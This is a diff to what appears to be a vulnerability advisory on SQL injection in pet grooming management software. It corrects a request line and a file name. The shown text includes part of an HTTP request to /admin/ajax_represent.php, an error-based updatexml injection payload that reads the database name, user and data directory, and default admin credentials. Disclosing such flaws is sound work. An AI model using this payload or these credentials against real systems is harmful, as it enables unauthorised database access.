@@ -20,7 +20,7 @@ The reason for the SQL injection vulnerability is that the website application d
 
 #### Payload used:
 
-```POST /login.php HTTP/1.1
+```
 POST /admin/ajax_represent.php HTTP/1.1
 Host: 192.168.67.28:8021
 Accept-Encoding: gzip, deflate
@@ -42,7 +42,7 @@ id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
 
 1、Log in to the system using the default password mdkhairnar92@gmail.com: admin
 
-2、By examining the /admin/barcode.php code, it was discovered that the drop_devices parameter was concatenated in the SQL statement
+2、By examining the /admin/ajax_represent.php code, it was discovered that the drop_devices parameter was concatenated in the SQL statement
 
 ![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/coderepresent.png)
 
